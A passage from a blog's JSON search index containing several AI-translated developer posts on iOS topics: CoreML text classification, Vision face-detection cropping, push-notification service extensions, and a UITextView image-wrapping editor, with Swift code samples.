myself only felt a real connection to machine learning after implementing this example, which sparked a strong interest in the field.StartThe first step, and the most important, is of course the ‚Äúmodel‚Äù mentioned earlier. Where does the model come from?There are three methods: Find pre-trained models online and convert them to CoreML formatAwesome-CoreML-Models This GitHub project collects many pre-trained models from others.Model conversion can refer to the official website or online resources. At the bottom of Apple‚Äôs Machine Learning official website, under Download Core ML Models, you can download models trained by Apple (mainly for learning or testing purposes). Train Your Own Model Using Tools üèÜ So, what can be done? Image Recognition üèÜ Text Content Recognition and Classification üèÜ Word Segmentation Text Language Detection Named Entity Recognition For word segmentation, please refer to Natural Language Processing in iOS Apps: An Introduction to NSLinguisticTaggerToday‚Äôs Key Points ‚Äî Text Content Recognition and Classification + Training Your Own ModelSimply put, we provide the machine with ‚Äútext content‚Äù and ‚Äúcategories‚Äù to train the computer to classify future data. For example: ‚ÄúClick to see the latest offers!‚Äù and ‚ÄúGet $1000 shopping credit now‚Äù =&gt; ‚ÄúAdvertisement‚Äù; ‚ÄúAlan sent you a message‚Äù and ‚ÄúYour account is about to expire‚Äù =&gt; ‚ÄúImportant matters‚ÄùPractical Applications: Spam Detection, Tag Generation, Classification Predictionp.s Since I haven‚Äôt figured out what to train the image recognition for, I haven‚Äôt explored it yet; interested friends can check out this article, the official GUI training tool for images is very convenient!!Required Tools: MacOS Mojave‚¨Ü + Xcode 10Training Tool: BlankSpace007/TextClassiferPlayground (The official version only provides a GUI training tool for images; text training requires coding yourself. This is a third-party tool offered by an expert online.)Prepare Training Data:The data structure is as shown in the above image, supporting .json and .csv files.Prepare the data for training. Here, we use Phpmyadmin (MySQL) to export the training data.SELECT `title` AS `text`,`type` AS `label` FROM `posts` WHERE `status` = '1'Change the export format to JSON[ {\"type\":\"header\",\"version\":\"4.7.5\",\"comment\":\"Export to JSON plugin for PHPMyAdmin\"}, {\"type\":\"database\",\"name\":\"db\"}, {\"type\":\"table\",\"name\":\"posts\",\"database\":\"db\",\"data\": //Remove above [ { \"label\":\"\", \"text\":\"\" } ] //Remove below }]Open the recently downloaded JSON file and keep only the content inside the DATA structure.Training Tools Used:After downloading the training tools, click TextClassifier.playground to open the PlaygroundClick the red box to execute -&gt; Click the green box to switch the View displayDrag the JSON file into the GUI toolOpen the Console below to check the training progress. Seeing the line ‚ÄúTest Accuracy‚Äù means the model training is complete.If there is too much data, it will test your computer‚Äôs processing power.After filling in the basic information, click ‚ÄúSave‚ÄùSave the trained model fileCoreML Model FileYour model is now fully trained! Wasn‚Äôt that easy?Specific Training Methods: First, perform word segmentation on the input sentence (e.g., ‚ÄúÊàëÊÉ≥Áü•ÈÅìÂ©öÁ¶ÆÈúÄË¶ÅÊ∫ñÂÇô‰ªÄÈ∫º‚Äù =&gt; ‚ÄúÊàëÊÉ≥‚Äù, ‚ÄúÁü•ÈÅì‚Äù, ‚ÄúÂ©öÁ¶Æ‚Äù, ‚ÄúÈúÄË¶Å‚Äù, ‚ÄúÊ∫ñÂÇô‚Äù, ‚Äú‰ªÄÈ∫º‚Äù), then determine its category and carry out a series of machine learning computations. Group the training data, for example: 80% is used for training and the other 20% is used for testing and validation. Up to this point, most of the work is done. Next, just add the model file to the iOS project and write a few lines of code.![Drag and drop the model file (.mlmodel) into the project](/assets/793bf2cdda0f/14Uc1elBmhEnQ-J8z_RIQHQ.webp){: lqip=‚Äùdata:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNDAwIiBoZWlnaHQ9IjgzMSI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==‚Äù }Drag and drop or add the model file (*.mlmodel) into the projectCode Section:import CoreML//if #available(iOS 12.0, *), let prediction = try? textClassifier().prediction(text: \"Text content to predict\") { let type = prediction.label print(\"I think it is... \\(type)\")}Completed!Questions to Explore: Can it support further learning? Can the mlmodel file be converted to other platforms? Can you train models on iOS? The above three points have all been found to be unfeasible based on current information.Conclusion:Currently, I apply it in practical apps to predict the category when posting articles.Marry Me APPI only have about 100 training data points, and the current prediction accuracy is around 35%. This is mainly for experimental purposes.‚Äî ‚Äî ‚Äî ‚Äî ‚ÄîIt‚Äôs that simple‚Äîcompleting the first machine learning project in life; there is still a long way to go to learn how the background works. I hope this project can inspire everyone!Reference: WWDC2018 Create ML (Part 2)If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Vision Face DetectionÔΩúSwift App Auto Crop Profile Pictures with Precision", "url": "/posts/zrealm-dev/vision-face-detection-swift-app-auto-crop-profile-pictures-with-precision-9a9aa892f9a9/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, swift, machine-learning, face-detection, ios, ios-app-development", "date": "2018-10-17 00:01:24 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Vision Exploration ‚Äî Automatic Face Detection and Cropping for App Avatar Uplo...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Vision Exploration ‚Äî Automatic Face Detection and Cropping for App Avatar Upload (Swift)Vision Practical Applications[2024/08/13 Update] Please refer to the new article and new API: ‚ÄúiOS Vision framework x WWDC 24 Discover Swift enhancements in the Vision framework Session‚ÄùWithout further ado, here is the finished product:Before Optimization V.S After Optimization ‚Äî ÁµêÂ©öÂêßAPPRecently, iOS 12 released an update, introducing the new CoreML machine learning framework. I found it quite interesting and started thinking about where it could be integrated into current products. CoreML Preview Article Now Published: Automatically Predict Article Categories Using Machine Learning, Including Training the Model YourselfCoreML provides interfaces for training and integrating text and image machine learning models into apps. My original idea was to use CoreML for facial recognition to solve the problem of cropped heads or faces in the app‚Äôs image cropping feature. As shown in the left image above, if a face appears near the edge, scaling and cropping can easily cut off part of the face.After some online research, I realized my knowledge was limited. This feature was already released in iOS 11: the ‚ÄúVision‚Äù framework, which supports text detection, face detection, image matching, QR code detection, object tracking, and more.This uses the face detection feature, optimized as shown in the right image; it locates the face and crops the image centered on it.Let‚Äôs Get Started:First, let‚Äôs create a function that can mark face locations to get a basic understanding of how to use Vision.Demo APPAs shown in the completed image above, it can mark the positions of the faces in the photo.p.s Only ‚Äúfaces‚Äù can be tagged; the entire head including hair is not allowed üòÖThis code is mainly divided into two parts. The first part addresses the issue of blank spaces when scaling the original image size to fit into an ImageView. Simply put, we want the ImageView‚Äôs size to match the Image‚Äôs size exactly. Directly placing the image causes alignment problems as shown below.You might think of directly changing ContentMode to fill, fit, or redraw, but this will cause distortion or the image to be cut off.let ratio = UIScreen.main.bounds.size.width// Here, because my UIImageView is set to align left and right at 0, with an aspect ratio of 1:1let sourceImage = UIImage(named: \"Demo2\")?.kf.resize(to: CGSize(width: ratio, height: CGFloat.leastNonzeroMagnitude), for: .aspectFill)// Using KingFisher's image resizing feature, width as the base, height flexibleimageView.contentMode = .redraw// contentMode set to redraw to fillimageView.image = sourceImage// Assign the imageimageViewConstraints.constant = (ratio - (sourceImage?.size.height ?? 0))imageView.layoutIfNeeded()imageView.sizeToFit()// This part adjusts the imageView's constraints, see the full example at the end of the articleThe above is the processing done for the image.For image cropping, we use Kingfisher to assist us, but it can be replaced with other libraries or custom methodsPart Two, Getting Straight to the Codeif #available(iOS 11.0, *) { // Supported only after iOS 11 let completionHandle: VNRequestCompletionHandler = { request, error in if let faceObservations = request.results as? [VNFaceObservation] { // Detected faces DispatchQueue.main.async { // Operate UIView, switch back to main thread let size = self.imageView.frame.size faceObservations.forEach({ (faceObservation) in // Coordinate system transformation let translate = CGAffineTransform.identity.scaledBy(x: size.width, y: size.height) let transform = CGAffineTransform(scaleX: 1, y: -1).translatedBy(x: 0, y: -size.height) let transRect = faceObservation.boundingBox.applying(translate).applying(transform) let markerView = UIView(frame: transRect) markerView.backgroundColor = UIColor.init(red: 0/255, green: 255/255, blue: 0/255, alpha: 0.3) self.imageView.addSubview(markerView) }) } } else { print(\"No faces detected\") } } // Recognition request let baseRequest = VNDetectFaceRectanglesRequest(completionHandler: completionHandle) let faceHandle = VNImageRequestHandler(ciImage: ciImage, options: [:]) DispatchQueue.global().async { // Recognition takes time, so run on background thread to avoid UI blocking do{ try faceHandle.perform([baseRequest]) }catch{ print(\"Throws: \\(error)\") } } } else { // print(\"Not supported\")}The main point to note is the coordinate system conversion; the recognized result is in the original coordinates of the Image. We need to convert it to the actual coordinates within the enclosing ImageView to use it correctly.Next, let‚Äôs move on to today‚Äôs main task ‚Äî cropping the profile picture according to the face position.let ratio = UIScreen.main.bounds.size.width// Here, because my UIImageView is set to align left and right at 0, with an aspect ratio of 1:1. See the full example at the end.let sourceImage = UIImage(named: \"Demo\")imageView.contentMode = .scaleAspectFill// Use scaleAspectFill mode to fillimageView.image = sourceImage// Directly assign the original image, we'll manipulate it laterif let image = sourceImage, #available(iOS 11.0, *), let ciImage = CIImage(image: image) { let completionHandle: VNRequestCompletionHandler = { request, error in if request.results?.count == 1, let faceObservation = request.results?.first as? VNFaceObservation { // One face detected let size = CGSize(width: ratio, height: ratio) let translate = CGAffineTransform.identity.scaledBy(x: size.width, y: size.height) let transform = CGAffineTransform(scaleX: 1, y: -1).translatedBy(x: 0, y: -size.height) let finalRect = faceObservation.boundingBox.applying(translate).applying(transform) let center = CGPoint(x: (finalRect.origin.x + finalRect.width / 2 - size.width / 2), y: (finalRect.origin.y + finalRect.height / 2 - size.height / 2)) // Calculate the center point of the face bounding box let newImage = image.kf.resize(to: size, for: .aspectFill).kf.crop(to: size, anchorOn: center) // Crop the image based on the center point DispatchQueue.main.async { // Update UIView on the main thread self.imageView.image = newImage } } else { print(\"Detected multiple faces or no face detected\") } } let baseRequest = VNDetectFaceRectanglesRequest(completionHandler: completionHandle) let faceHandle = VNImageRequestHandler(ciImage: ciImage, options: [:]) DispatchQueue.global().async { do { try faceHandle.perform([baseRequest]) } catch { print(\"Throws: \\(error)\") } }} else { print(\"Not supported\")}The principle is similar to marking face positions. The difference is that the profile picture has a fixed size (e.g., 300x300), so we skip the first part where the Image needs to fit the ImageView.Another difference is that we need to calculate the center point of the face area and use this center point as the reference to crop the image.The red dot marks the center point of the face areaFinal Render:The moment just before the snap is the original image positionComplete APP Example:The code has been uploaded to Github: Click hereIf you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "iOS Notification Service ExtensionÔΩúEnhance Push Notifications with Swift", "url": "/posts/zrealm-dev/ios-notification-service-extension-enhance-push-notifications-with-swift-cb6eba52a342/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, swift, push-notification, notification-service, ios, ios-app-development", "date": "2018-10-15 23:44:01 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!iOS ‚â• 10 Notification Service Extension Application (Swift)Image Push Notifica...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!iOS ‚â• 10 Notification Service Extension Application (Swift)Image Push Notifications, Push Notification Display Statistics, Push Notification Display PreprocessingRegarding the basics of push notification setup and principles, there is plenty of information available online, so it will not be discussed here. This article focuses on how to enable image push notifications in the app and use new features to achieve more precise push display statistics.As shown in the above image, the Notification Service Extension allows you to preprocess the push notification after the app receives it, before displaying the notification content.The official documentation states that when processing incoming push notifications, the processing time limit is about 30 seconds. If there is no callback within 30 seconds, the push notification will continue to be delivered and appear on the user‚Äôs device.Support LeveliOS ‚â• 10.0What can you do in 30 seconds? (Goal 1) Download images from the image link field in the push notification content and attach them to the push notification content üèÜ (Goal 2) Track whether push notifications are displayed üèÜ Push Notification Content Modification and Reorganization Push Notification Content Encryption and Decryption (Decryption) Display Decide whether to show push notifications? =&gt; Answer: No First, the Payload part of the backend push notification programThe backend must add a line \"mutable-content\":1 in the push notification structure for the system to execute the Notification Service Extension upon receiving the notification.{ \"aps\": { \"alert\": { \"title\": \"New Article Recommended for You\", \"body\": \"Check it out now\" }, \"mutable-content\":1, \"sound\": \"default\", \"badge\": 0 }}And‚Ä¶ Step 1, Create a New Target for the ProjectStep 1. Xcode -&gt; File -&gt; New -&gt; TargetStep 2. iOS -&gt; Notification Service Extension -&gt; NextStep 3. Enter Product Name -&gt; FinishStep 4. Click ActivateStep 2: Write the Push Notification Content HandlerFound Product Name/NotificationService.swift fileimport UserNotificationsclass NotificationService: UNNotificationServiceExtension { var contentHandler: ((UNNotificationContent) -&gt; Void)? var bestAttemptContent: UNMutableNotificationContent? override func didReceive(_ request: UNNotificationRequest, withContentHandler contentHandler: @escaping (UNNotificationContent) -&gt; Void) { self.contentHandler = contentHandler bestAttemptContent = (request.content.mutableCopy() as? UNMutableNotificationContent) if let bestAttemptContent = bestAttemptContent { // Modify the notification content here... // Handle push notification content here, load image back bestAttemptContent.title = \"\\(bestAttemptContent.title) [modified]\" contentHandler(bestAttemptContent) } } override func serviceExtensionTimeWillExpire() { // Called just before the extension will be terminated by the system. // Use this as an opportunity to deliver your \"best attempt\" at modified content, otherwise the original push payload will be used. // Time is about to expire, just modify the title without loading image if let contentHandler = contentHandler, let bestAttemptContent = bestAttemptContent { contentHandler(bestAttemptContent) } }}As shown in the code above, NotificationService has two interfaces; the first is didReceive, which is triggered when a push notification arrives. After processing, you need to call the callback method contentHandler(bestAttemptContent) to inform the system.If the CallBack Method is not called within the time limit, the second function serviceExtensionTimeWillExpire() will be triggered due to timeout. At this point, it‚Äôs basically too late to recover, and you can only perform some cleanup tasks (e.g., simply modifying the title or content without loading network data).Practical ExampleHere we assume our Payload is as follows{ \"aps\": { \"alert\": { \"push_id\":\"2018001\", \"title\": \"New Article Recommended for You\", \"body\": \"Check it out now\", \"image\": \"https://d2uju15hmm6f78.cloudfront.net/image/2016/12/04/3113/2018/09/28/trim_153813426461775700_450x300.jpg\" }, \"mutable-content\":1, \"sound\": \"default\", \"badge\": 0 }}‚Äúpush_id‚Äù and ‚Äúimage‚Äù are both custom fields. push_id is used to identify the push notification for easy tracking and reporting back to the server; image is the URL of the image to be attached to the push notification.override func didReceive(_ request: UNNotificationRequest, withContentHandler contentHandler: @escaping (UNNotificationContent) -&gt; Void) { self.contentHandler = contentHandler bestAttemptContent = (request.content.mutableCopy() as? UNMutableNotificationContent) if let bestAttemptContent = bestAttemptContent { guard let info = request.content.userInfo[\"aps\"] as? NSDictionary,let alert = info[\"alert\"] as? Dictionary&lt;String,String&gt; else { contentHandler(bestAttemptContent) return // Notification content format is not as expected, do not process } // Goal 2: // Send back to Server to notify that the notification was displayed if let push_id = alert[\"push_id\"],let url = URL(string: \"È°ØÁ§∫Áµ±Ë®àAPIÁ∂≤ÂùÄ\") { var request = URLRequest(url: url, cachePolicy: .reloadIgnoringLocalCacheData, timeoutInterval: 30) request.httpMethod = \"POST\" request.addValue(UserAgent, forHTTPHeaderField: \"User-Agent\") var httpBody = \"push_id=\\(push_id)\" request.addValue(\"application/x-www-form-urlencoded\", forHTTPHeaderField: \"Content-Type\") request.httpBody = httpBody.data(using: .utf8) let task = URLSession.shared.dataTask(with: request) { (data, response, error) in } DispatchQueue.global().async { task.resume() // Asynchronous processing, ignore result } } // Goal 1: guard let imageURLString = alert[\"image\"],let imageURL = URL(string: imageURLString) else { contentHandler(bestAttemptContent) return // If no image is attached, no special handling needed } let dataTask = URLSession.shared.dataTask(with: imageURL) { (data, response, error) in guard let fileURL = NSURL(fileURLWithPath: NSTemporaryDirectory()).appendingPathComponent(imageURL.lastPathComponent) else { contentHandler(bestAttemptContent) return } guard (try? data?.write(to: fileURL)) != nil else { contentHandler(bestAttemptContent) return } guard let attachment = try? UNNotificationAttachment(identifier: \"image\", url: fileURL, options: nil) else { contentHandler(bestAttemptContent) return } // Above reads the image URL, downloads it to the device, and creates a UNNotificationAttachment bestAttemptContent.categoryIdentifier = \"image\" bestAttemptContent.attachments = [attachment] // Add the image attachment to the notification bestAttemptContent.body = (bestAttemptContent.body == \"\") ? (\"View Now\") : (bestAttemptContent.body) // If the body is empty, use default text \"View Now\" contentHandler(bestAttemptContent) } dataTask.resume() }}I didn‚Äôt do anything special with the serviceExtensionTimeWillExpire part, so I won‚Äôt include it; the key is still the didReceive code above.You can see that when a push notification is received, we first call an API to inform the backend that the notification has been received and displayed, which helps with push notification statistics; then, if there is an attached image, we process the image.When In-App:It will still trigger the Notification Service Extension didReceive, which then triggers the AppDelegate‚Äôs func application( _ application: UIApplication, didReceiveRemoteNotification userInfo: [AnyHashable : Any ], fetchCompletionHandler completionHandler: @escaping (UIBackgroundFetchResult) -&gt; Void) method.Note: Regarding image push notifications, you can also‚Ä¶.Using Notification Content Extension to customize the UIView displayed when a push notification is pressed (can be custom designed), as well as handling the press action.You can refer to this article: iOS10 Push Notification Advanced (Notification Extension)iOS 12 and later support more action handling: iOS 12 New Notification Features: Adding Interactivity Implementing Complex Functions in NotificationsFor the Notification Content Extension part, I only added a UIView that can display image notifications and didn‚Äôt put much thought into it:ÁµêÂ©öÂêßAPPIf you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "iOS UITextView Text Wrap EditorÔΩúSwift Implementation for Seamless Layout", "url": "/posts/zrealm-dev/ios-uitextview-text-wrap-editor-swift-implementation-for-seamless-layout-e37d66ea1146/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, swift, ios, mobile-app-development, uitextview, ios-app-development", "date": "2018-10-14 02:07:49 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!iOS UITextView Text Wrapping Editor (Swift)Practical RouteGoal Function:The ap...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!iOS UITextView Text Wrapping Editor (Swift)Practical RouteGoal Function:The app has a forum feature that allows users to post articles. The posting interface needs to support text input, inserting multiple images, and text wrapping around images.Functional Requirements: Can enter multiple lines of text Can insert images inline within text Can upload multiple images Can freely remove inserted images Image upload success/failure handling Can convert input content into transferable text, e.g., BBCODE Here‚Äôs the final result image:ÁµêÂ©öÂêßAPPStart:Chapter 1What? You said Chapter One? Isn‚Äôt it enough to use UITextView to create an editor? Why bother dividing it into ‚Äúchapters‚Äù? Yes, that was my initial reaction too, until I started working on it and realized it wasn‚Äôt that simple. I struggled for two weeks, flipping through various domestic and international resources before finding a solution. Let me share the journey of my implementation‚Ä¶If you want to see the final solution directly, please skip to the last chapter (scroll down, down, down, down, down).At the BeginningThe text editor naturally uses the UITextView component. According to the documentation, UITextView‚Äôs attributedText includes NSTextAttachment objects that can attach images to achieve text wrapping effects. The code is also very simple:let imageAttachment = NSTextAttachment()imageAttachment.image = UIImage(named: \"example\")self.contentTextView.attributedText = NSAttributedString(attachment: imageAttachment)At first, I was naive and happy, thinking it was quite simple and convenient; but the real problems are just beginning: Images must be selectable and uploadable from local storage: This is easy to solve. For the image picker, I use the TLPhotoPicker library (supports multiple image selection, customization, camera switching, and Live Photos). The approach is to convert the PHAsset to UIImage after TLPhotoPicker‚Äôs selection callback, assign it to imageAttachment.image, and upload the image to the server in the background in advance. Image upload needs to show effects and allow interactive actions (click to view original image / click X to delete): not achieved yet, unable to find a way with NSTextAttachment to fulfill this requirement. However, it‚Äôs okay without this feature since images can still be deleted (pressing the ‚ÄúBack‚Äù key on the keyboard after the image deletes it). Let‚Äôs continue‚Ä¶ Original image files are too large, causing slow upload, slow insertion, and high resource use: Resize them before uploading and inserting using Kingfisher‚Äôs resizeTo function. Insert the image at the cursor position: Here, the original code should be changed as follows let range = self.contentTextView.selectedRange.location ?? NSRange(location: 0, length: 0)let combination = NSMutableAttributedString(attributedString: self.contentTextView.attributedText) // Get current contentcombination.insert(NSAttributedString(attachment: imageAttachment), at: range)self.contentTextView.attributedText = combination // Write back Image Upload Failure Handling: Here, I want to mention that I actually wrote a separate class to extend the original NSTextAttachment, aiming to add an extra property to store an identification value.class UploadImageNSTextAttachment:NSTextAttachment { var uuid:String?}Change to when uploading images:let id = UUID().uuidStringlet attachment = UploadImageNSTextAttachment()attachment.uuid = idIf we can identify the corresponding NSTextAttachment, we can search for the NSTextAttachment in the attributedText for the images that failed to upload, find them, and replace them with an error placeholder image or remove them directly.if let content = self.contentTextView.attributedText { content.enumerateAttributes(in: NSMakeRange(0, content.length), options: NSAttributedString.EnumerationOptions(rawValue: 0)) { (object, range, stop) in if object.keys.contains(NSAttributedStringKey.attachment) { if let attachment = object[NSAttributedStringKey.attachment] as? UploadImageNSTextAttachment, attachment.uuid == \"targetID\" { attachment.bounds = CGRect(x: 0, y: 0, width: 30, height: 30) attachment.image = UIImage(named: \"IconError\") let combination = NSMutableAttributedString(attributedString: content) combination.replaceCharacters(in: range, with: NSAttributedString(attachment: attachment)) // To remove directly, use deleteCharacters(in: range) self.contentTextView.attributedText = combination } } }}After overcoming the above issues, the code will look roughly like this:class UploadImageNSTextAttachment:NSTextAttachment { var uuid:String?}func dismissPhotoPicker(withTLPHAssets: [TLPHAsset]) { // Callback for TLPhotoPicker image picker let range = self.contentTextView.selectedRange.location ?? NSRange(location: 0, length: 0) // Get cursor position, default to start if none guard withTLPHAssets.count &gt; 0 else { return } DispatchQueue.global().async { in // Process in background let orderWithTLPHAssets = withTLPHAssets.sorted(by: { $0.selectedOrder &gt; $1.selectedOrder }) orderWithTLPHAssets.forEach { (obj) in if var image = obj.fullResolutionImage { let id = UUID().uuidString var maxWidth:CGFloat = 1500 var size = image.size if size.width &gt; maxWidth { size.width = maxWidth size.height = (maxWidth/image.size.width) * size.height } image = image.resizeTo(scaledToSize: size) // Resize image let attachment = UploadImageNSTextAttachment() attachment.bounds = CGRect(x: 0, y: 0, width: size.width, height: size.height) attachment.uuid = id DispatchQueue.main.async { // Switch back to main thread to update UI and insert image let combination = NSMutableAttributedString(attributedString: self.contentTextView.attributedText) attachments.forEach({ (attachment) in combination.insert(NSAttributedString(string: \"\\n\"), at: range) combination.insert(NSAttributedString(attachment: attachment), at: range) combination.insert(NSAttributedString(string: \"\\n\"), at: range) }) self.contentTextView.attributedText = combination } // Upload image to server // Alamofire post or.... // POST image // if failed { if let content = self.contentTextView.attributedText { content.enumerateAttributes(in: NSMakeRange(0, content.length), options: NSAttributedString.EnumerationOptions(rawValue: 0)) { (object, range, stop) in if object.keys.contains(NSAttributedStringKey.attachment) { if let attachment = object[NSAttributedStringKey.attachment] as? UploadImageNSTextAttachment,attachment.uuid == obj.key { // REPLACE: attachment.bounds = CGRect(x: 0, y: 0, width: 30, height: 30) attachment.image = // ERROR Image let combination = NSMutableAttributedString(attributedString: content) combination.replaceCharacters(in: range, with: NSAttributedString(attachment: attachment)) // OR DELETE: // combination.deleteCharacters(in: range) self.contentTextView.attributedText = combination } } } } //} // } } }}By this point, most problems were solved, so what troubled me for two weeks?Answer: ‚ÄúMemory‚Äù issueiPhone 6 can‚Äôt hold up anymore!When inserting more than 5 images using the above method, UITextView will start to lag; beyond a certain point, the app will crash due to memory overload.p.s Tried various compression/other storage methods, but the result remains the sameThe suspected reason is that UITextView does not reuse NSTextAttachments for images, so all the images you insert are loaded into memory and not released; therefore, unless they are small icons like emojis üòÖ, they cannot be used for text wrapping.Chapter 2After discovering this ‚Äúhardware flaw‚Äù in the memory, I continued searching online for solutions and found the following methods: Using WebView to embed an HTML file (with &lt;div contentEditable=\"true\"&gt;&lt;/div&gt;) and interacting between JS and WebView Using UITableView with UITextView, enabling reuse Extending UITextView Based on TextKit üèÜ The first method uses WebView to embed an HTML file; considering performance and user experience, it is not considered. Interested readers can search for related solutions on GitHub (e.g., RichTextDemo).Item 2: Using UITableView with UITextViewI have implemented about 70% of it. Specifically, each line corresponds to a cell. There are two types of cells: one with a UITextView and one with a UIImageView. The layout alternates between an image line and a text line. The content must be stored in an array to prevent loss during reuse.Efficient reuse can solve memory issues, but eventually, it was abandoned. The parts where pressing Return at the end of a line should create a new line and move the cursor there and where pressing Backspace at the beginning of a line should move to the previous line (and delete the current line if it is empty) were particularly challenging and hard to control.For those interested, please refer to: MMRichTextEditFinal ChapterHaving spent a lot of time reaching this point, the development schedule is seriously delayed; the current final solution is to use TextKit.Here are two articles for friends interested in researching: TextKit Exploration Text Rendering Optimization from UITextView But there is a certain learning curve, which is too difficult for a newbie like me. Besides, I don‚Äôt have enough time, so I can only aimlessly search on Github to borrow ideas from others.Finally found XLYTextKitExtension, a project that can be directly imported and used in code.‚úî Enable NSTextAttachment to support custom UIView with any interactive operations needed‚úî NSTextAttachment can be reused without causing memory bloatThe specific implementation is similar to Chapter 1, except that NSTextAttachment is replaced with XLYTextAttachment.For the UITextView to be used:contentTextView.setUseXLYLayoutManager()Tip 1: Change the place where NSTextAttachment is inserted tolet combine = NSMutableAttributedString(attributedString: NSAttributedString(string: \"\"))let imageView = UIView() // your custom viewlet imageAttachment = XLYTextAttachment { () -&gt; UIView in return imageView}imageAttachment.id = idimageAttachment.bounds = CGRect(x: 0, y: 0, width: size.width, height: size.height)combine.append(NSAttributedString(attachment: imageAttachment))self.contentTextView.textStorage.insert(combine, at: range)Tip 2: Change NSTextAttachment search toself.contentTextView.textStorage.enumerateAttribute(NSAttributedStringKey.attachment, in: NSRange(location: 0, length: self.contentTextView.textStorage.length), options: []) { (value, range, stop) in if let attachment = value as? XLYTextAttachment { //attachment.id }}Tip 3: Delete the NSTextAttachment item and replace it withself.contentTextView.textStorage.deleteCharacters(in: range)Tip 4: Get the Current Content Lengthself.contentTextView.textStorage.lengthTip 5: Refresh the Bounds Size of the AttachmentThe main reason is for user experience; when inserting an image, I first insert a loading image. The inserted image is replaced only after it is compressed in the background. The TextAttachment‚Äôs bounds need to be updated to the resized dimensions.self.contentTextView.textStorage.addAttributes([:], range: range)(Add empty attribute to trigger refresh)Tip 6: Convert Input Content into Transmittable TextUse Tip 2 to search all input content and extract the Attachment IDs, then combine them into a format like [[ID]] for passing.Tip 7: Content Replacementself.contentTextView.textStorage.replaceCharacters(in: range, with: NSAttributedString(attachment: newImageAttachment))Tip 8: Use Regular Expressions to Match the Range of Contentlet pattern = \"(\\\\[\\\\[image_id=){1}([0-9]+){1}(\\\\]\\\\]){1}\"let textStorage = self.contentTextView.textStorageif let regex = try? NSRegularExpression(pattern: pattern, options: .caseInsensitive) { while true { let range = NSRange(location: 0, length: textStorage.length) if let match = regex.matches(in: textStorage.string, options: .withTransparentBounds, range: range).first { let matchString = textStorage.attributedSubstring(from: match.range) //FOUND! } else { break } }}Note: When using Find &amp; Replace, you must use a While loop. Otherwise, if there are multiple search results, replacing the first one will cause the range of subsequent results to be incorrect, leading to a crash.ConclusionThe product has been completed and launched using this method, and no issues have been encountered so far; I will take the time to thoroughly explore the underlying principles later!This article is more of a personal problem-solving experience rather than a tutorial; if you are working on similar features, I hope it helps you. Feel free to contact me with any questions or feedback. The Official First Post on MediumFurther Reading ZMarkupParser HTML String to NSAttributedString Tool The Story of Handcrafting an HTML Parser For any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Blog Revival: How to Claim Your Final Adsense Payment and Restart Writing", "url": "/posts/zrealm-life/blog-revival-how-to-claim-your-final-adsense-payment-and-restart-writing-b7a3fb3d5531/", "categories": "ZRealm Life.", "tags": "english, ai-translation, blog, blogger, developer, life, medium", "date": "2018-10-06 12:53:36 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything 